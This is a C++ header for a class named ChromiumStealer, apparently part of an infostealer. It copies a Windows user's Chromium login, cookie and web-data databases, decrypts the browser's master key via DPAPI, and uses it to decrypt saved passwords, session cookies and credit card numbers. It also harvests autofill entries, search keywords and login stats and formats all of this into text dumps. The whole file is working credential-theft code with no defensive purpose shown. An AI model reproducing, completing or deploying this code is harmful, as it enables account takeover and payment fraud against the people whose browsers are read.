#pragma once

#include "utils/base64/base64.hpp"
#include "utils/sqlite3/sqlite3.h"
#include "utils/fileio/fileio.hpp"
#include "utils/utils.hpp"

#include <iostream>
#include <sstream>
#include <vector>
#include <cstdlib>
#include <fstream>
#include <filesystem>

#include <stdio.h>
#include <windows.h>

#include <openssl/evp.h>

using json = nlohmann::json;

class ChromiumStealer {
public:
    struct password_data {
        std::string action_url;
        std::string username_value;
        std::string password_value;
    };

    struct cookie_data {
        std::string action_url;
        std::string name;
        std::string value;
    };

    struct creditc_data {
        std::string name_on_card;
        std::string card_number;
        int exp_year = -1;
        int exp_month = -1;
    };

    struct autofill_data {
        std::string name;
        std::string value;
    };

    struct keyword_data {
        std::string name;
        std::string keyword;
        std::string url;
    };

    struct status_data {
        std::string url;
        std::string username;
    };

    ChromiumStealer(std::string &localstate, std::string &database) {

        size_t requiredSize;
        char *buffer;

        getenv_s(&requiredSize, NULL, 0, "LOCALAPPDATA");

        buffer = new char[requiredSize];

        getenv_s(&requiredSize, buffer, requiredSize, "LOCALAPPDATA");

        appdata = std::string(buffer);

        requiredSize = NULL;
        buffer = nullptr;

        getenv_s(&requiredSize, NULL, 0, "TEMP");

        buffer = new char[requiredSize];

        getenv_s(&requiredSize, buffer, requiredSize, "TEMP");

        temp = std::string(buffer);

        localstate_p = localstate;
        database_p = database;
    }

    ~ChromiumStealer() {
        if (db_cookie) {
            sqlite3_close(db_cookie);
        }

        if (db_login) {
            sqlite3_close(db_login);
        }

        if (db_web) {
            sqlite3_close(db_web);
        }

        if (std::filesystem::exists(c_login_path)) {
            std::filesystem::remove(c_login_path);
        }

        if (std::filesystem::exists(c_cookie_path)) {
            std::filesystem::remove(c_cookie_path);
        }

        if (std::filesystem::exists(c_web_path)) {
            std::filesystem::remove(c_web_path);
        }
    }

    bool initialize() {

        c_login_path = temp + "\\temp-file-l-" + std::to_string(utils::get::random_number(1, 1000)) + "-" + std::to_string(utils::get::milliseconds_since_epoch());
        c_cookie_path = temp + "\\temp-file-c-" + std::to_string(utils::get::random_number(1, 1000)) + "-" + std::to_string(utils::get::milliseconds_since_epoch());
        c_web_path = temp + "\\temp-file-w-" + std::to_string(utils::get::random_number(1, 1000)) + "-" + std::to_string(utils::get::milliseconds_since_epoch());

        std::string path = appdata + "\\" + database_p + "\\";

        if (fileIO::file_copy(path + "Login Data", c_login_path)) {
            if (sqlite3_open(c_login_path.c_str(), &db_login)) {
                fileIO::file_remove(c_login_path);
            }
            else
            {
                printf("database open %s\n", c_login_path.c_str());
            }
        }

        if (fileIO::file_copy(path + "Network\\Cookies", c_cookie_path)) {
            if (sqlite3_open(c_cookie_path.c_str(), &db_cookie)) {
                fileIO::file_remove(c_cookie_path);
            }
            else
            {
                printf("database open %s\n", c_cookie_path.c_str());
            }
        }

        if (fileIO::file_copy(path + "Web Data", c_web_path)) {
            if (sqlite3_open(c_web_path.c_str(), &db_web)) {
                fileIO::file_remove(c_web_path);
            }
            else
            {
                printf("database open %s\n", c_web_path.c_str());
            }
        }

        return get_master_key(appdata + "\\" + localstate_p, master_key);
    }

    std::vector<password_data> get_password() {
        std::vector<password_data> result;
        
        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_login, "SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *username = sqlite3_column_text(stmt, 1);
            const unsigned char *ciphertext = sqlite3_column_text(stmt, 2);

            std::string password;
            std::string tag;
            std::string iv;

            trim_cipher(std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 2)), sqlite3_column_bytes(stmt, 2)), password, tag, iv);

            std::vector<unsigned char> pass_bytes;
            utils::conversion::string_to_byte_vector(password, pass_bytes);

            std::vector<unsigned char> tag_bytes;
            utils::conversion::string_to_byte_vector(tag, tag_bytes);

            std::vector<unsigned char> iv_bytes;
            utils::conversion::string_to_byte_vector(iv, iv_bytes);

            std::vector<unsigned char> key_bytes;
            utils::conversion::string_to_byte_vector(master_key, key_bytes);

            unsigned char *plaintext = (unsigned char *)malloc(10000);

            password_data data;
            data.action_url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
            data.username_value = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));

            std::string decrypted_pass;

            decrypt_gcm256(pass_bytes.data(), pass_bytes.size(), tag_bytes.data(), key_bytes.data(), iv_bytes.data(), iv_bytes.size(), plaintext);

            utils::conversion::bytes_array_to_string(plaintext, pass_bytes.size(), decrypted_pass);

            data.password_value = decrypted_pass;

            result.push_back(data);
            
            free(plaintext);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::vector<cookie_data> get_cookies() {
        std::vector<cookie_data> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_cookie, "SELECT host_key, name, value, encrypted_value, path FROM cookies ORDER BY creation_utc", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *name = sqlite3_column_text(stmt, 1);
            const unsigned char *ciphertext = sqlite3_column_text(stmt, 3);

            std::string password;
            std::string tag;
            std::string iv;

            trim_cipher(std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 3)), sqlite3_column_bytes(stmt, 3)), password, tag, iv);

            std::vector<unsigned char> pass_bytes;
            utils::conversion::string_to_byte_vector(password, pass_bytes);

            std::vector<unsigned char> tag_bytes;
            utils::conversion::string_to_byte_vector(tag, tag_bytes);

            std::vector<unsigned char> iv_bytes;
            utils::conversion::string_to_byte_vector(iv, iv_bytes);

            std::vector<unsigned char> key_bytes;
            utils::conversion::string_to_byte_vector(master_key, key_bytes);

            unsigned char *plaintext = (unsigned char *)malloc(10000);

            cookie_data data;
            data.action_url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
            data.name = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));

            std::string decrypted_pass;

            decrypt_gcm256(pass_bytes.data(), pass_bytes.size(), tag_bytes.data(), key_bytes.data(), iv_bytes.data(), iv_bytes.size(), plaintext);

            utils::conversion::bytes_array_to_string(plaintext, pass_bytes.size(), decrypted_pass);

            data.value = decrypted_pass;

            result.push_back(data);

            free(plaintext);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::vector<autofill_data> get_autofill() {
        std::vector<autofill_data> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_web, "SELECT name, value FROM autofill ORDER BY date_created", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {

            autofill_data data;
            data.name = std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
            data.value = std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1)));

            result.push_back(data);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::vector<creditc_data> get_credit_card() {
        std::vector<creditc_data> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_web, "SELECT name_on_card, expiration_year, expiration_month, card_number_encrypted FROM credit_cards ORDER BY date_modified", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const unsigned char *name_on_card = sqlite3_column_text(stmt, 0);
            const unsigned char *ciphertext = sqlite3_column_text(stmt, 3);
            const int exp_year = sqlite3_column_int(stmt, 1);
            const int exp_month = sqlite3_column_int(stmt, 2);

            std::string password;
            std::string tag;
            std::string iv;

            trim_cipher(std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 3)), sqlite3_column_bytes(stmt, 3)), password, tag, iv);

            std::vector<unsigned char> pass_bytes;
            utils::conversion::string_to_byte_vector(password, pass_bytes);

            std::vector<unsigned char> tag_bytes;
            utils::conversion::string_to_byte_vector(tag, tag_bytes);

            std::vector<unsigned char> iv_bytes;
            utils::conversion::string_to_byte_vector(iv, iv_bytes);

            std::vector<unsigned char> key_bytes;
            utils::conversion::string_to_byte_vector(master_key, key_bytes);

            unsigned char *plaintext = (unsigned char *)malloc(10000);

            creditc_data data;
            data.name_on_card = std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
            data.exp_year = exp_year;
            data.exp_month = exp_month;

            std::string decrypted_number;

            decrypt_gcm256(pass_bytes.data(), pass_bytes.size(), tag_bytes.data(), key_bytes.data(), iv_bytes.data(), iv_bytes.size(), plaintext);

            utils::conversion::bytes_array_to_string(plaintext, pass_bytes.size(), decrypted_number);

            data.card_number = decrypted_number;

            result.push_back(data);

            free(plaintext);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::vector<keyword_data> get_keywords() {
        std::vector<keyword_data> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_web, "SELECT short_name, keyword, url FROM keywords ORDER BY date_created", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const char *short_name = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
            const char *keyword = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));
            const char *url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 2));

            keyword_data data;
            data.name = std::string(short_name);
            data.keyword = std::string(keyword);
            data.url = std::string(url);

            result.push_back(data);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::vector<status_data> get_status() {
        std::vector<status_data> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_login, "SELECT origin_domain, username_value FROM stats ORDER BY update_time", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const char *url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
            const char *username = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));

            status_data data;
            data.url = std::string(url);
            data.username = std::string(username);

            result.push_back(data);
        }

        sqlite3_finalize(stmt);

        return result;
    }

    std::string print_passwords(std::vector<ChromiumStealer::password_data> &pass_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::password_data &data : pass_data) {

            if (data.action_url.empty() && data.username_value.empty() && data.password_value.empty()) { continue; }

            ss << "-------\n";

            if (!data.action_url.empty()) {
                ss << "url: " << data.action_url <<"\n";
            }

            if (!data.username_value.empty()) {
                ss << "name: " << data.username_value << "\n";
            }

            if (!data.password_value.empty()) {
                ss << "password: " << data.password_value << "\n";
            }

            ss << "-------\n\n";
        }
        if (pass_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

    std::string print_cookies(std::vector<ChromiumStealer::cookie_data> &cookies_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::cookie_data &data : cookies_data) {

            if (data.action_url.empty() && data.name.empty() && data.value.empty()) { continue; }

            ss << "-------\n";

            if (!data.action_url.empty()) {
                ss << "url: " << data.action_url << "\n";
            }

            if (!data.name.empty()) {
                ss << "name: " << data.name << "\n";
            }

            if (!data.value.empty()) {
                ss << "value: " << data.value << "\n";
            }

            ss << "-------\n\n";
        }
        if (cookies_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

    std::string print_autofills(std::vector<ChromiumStealer::autofill_data> &auto_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::autofill_data &data : auto_data) {

            if (data.name.empty() && data.value.empty()) { continue; }

            ss << "-------\n";

            if (!data.name.empty()) {
                ss << "name: " << data.name << "\n";
            }

            if (!data.value.empty()) {
                ss << "value: " << data.value << "\n";
            }

            ss << "-------\n\n";
        }
        if (auto_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

    std::string print_credit_cards(std::vector<ChromiumStealer::creditc_data> &card_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::creditc_data &data : card_data) {

            if (data.name_on_card.empty() && data.exp_year == -1 && data.exp_month == -1 && data.card_number.empty()) { continue; }

            ss << "-------\n";

            if (!data.name_on_card.empty()) {
                ss << "name: " << data.name_on_card << "\n";
            }

            if (!data.card_number.empty()) {
                ss << "value: " << data.card_number << "\n";
            }

            ss << "expiration_year: " << data.exp_year << "\n";

            ss << "expiration_month: " << data.exp_month << "\n";

            ss << "-------\n\n";
        }
        if (card_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

    std::string print_keywords(std::vector<ChromiumStealer::keyword_data> &key_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::keyword_data &data : key_data) {

            if (data.name.empty() && data.keyword.empty() && data.url.empty()) { continue; }

            ss << "-------\n";

            if (!data.name.empty()) {
                ss << "name: " << data.name << "\n";
            }

            if (!data.keyword.empty()) {
                ss << "keyword: " << data.keyword << "\n";
            }

            if (!data.url.empty()) {
                ss << "url: " << data.url << "\n";
            }

            ss << "-------\n\n";
        }
        if (key_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

    std::string print_statuses(std::vector<ChromiumStealer::status_data> &status_data) {

        std::stringstream ss;

        ss << "\n-------------------\n";
        for (ChromiumStealer::status_data &data : status_data) {

            if (data.url.empty() && data.username.empty()) { continue; }

            ss << "-------\n";

            if (!data.url.empty()) {
                ss << "url: " << data.url << "\n";
            }

            if (!data.username.empty()) {
                ss << "username: " << data.username << "\n";
            }

            ss << "-------\n\n";
        }
        if (status_data.empty()) {
            ss << "NULL\n";
        }
        ss << "-------------------\n";

        return ss.str();
    }

private:

    std::string appdata;
    std::string temp;

    std::string localstate_p;
    std::string database_p;

    std::string c_login_path;
    std::string c_cookie_path;
    std::string c_web_path;

    std::string master_key;

    sqlite3 *db_cookie = nullptr;
    sqlite3 *db_login = nullptr;
    sqlite3 *db_web = nullptr;

    bool decrypt_win32(const std::string &in, std::string &out) {

        DATA_BLOB encryptedBlob;
        DATA_BLOB plaintextBlob;

        encryptedBlob.pbData = reinterpret_cast<BYTE *>(const_cast<char *>(in.data()));
        encryptedBlob.cbData = static_cast<DWORD>(in.size());

        bool success = CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &plaintextBlob);

        if (success) {
            out.assign(reinterpret_cast<char *>(plaintextBlob.pbData), plaintextBlob.cbData);
            LocalFree(plaintextBlob.pbData);
        }

        return success;
    }

    bool get_master_key(const std::string &path, std::string &out) {

        std::ifstream file(path.c_str());

        std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

        json json_contents = json::parse(contents);
        if (!json_contents.contains("encrypted_key")) {
            return false;
        }

        std::string encrypted_key = json_contents["encrypted_key"];

        std::string decoded64key;
        base64::decode(encrypted_key, decoded64key);
        decoded64key.erase(0, 5);

        return decrypt_win32(decoded64key, out);
    }

    bool trim_cipher(const std::string &original_data, std::string &out_pass, std::string &out_tag, std::string &iv) {
        if (original_data.size() < 15) {
            return false;
        }
        iv = original_data.substr(3, 12);
        if (original_data.size() < 15 + iv.size()) {
            return false;
        }
        std::string buf = original_data.substr(15);

        if (buf.size() < 16) {
            return false;
        }
        out_tag = buf.substr(buf.size() - 16);
        out_pass = buf.substr(0, buf.size() - 16);

        return true;
    }

    int decrypt_gcm256(unsigned char *ciphertext, int ciphertext_len, unsigned char *tag,
        unsigned char *key, unsigned char *iv, int iv_len,
        unsigned char *plaintext) {
        EVP_CIPHER_CTX *ctx;
        int len;
        int plaintext_len;
        int ret;

        ctx = EVP_CIPHER_CTX_new();

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL);

        EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);

        EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len);

        plaintext_len = len;

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);

        ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

        EVP_CIPHER_CTX_free(ctx);

        if (ret > 0) {
            plaintext_len += len;
            return plaintext_len;
        }
        else {
            return -1;
        }
    }
};
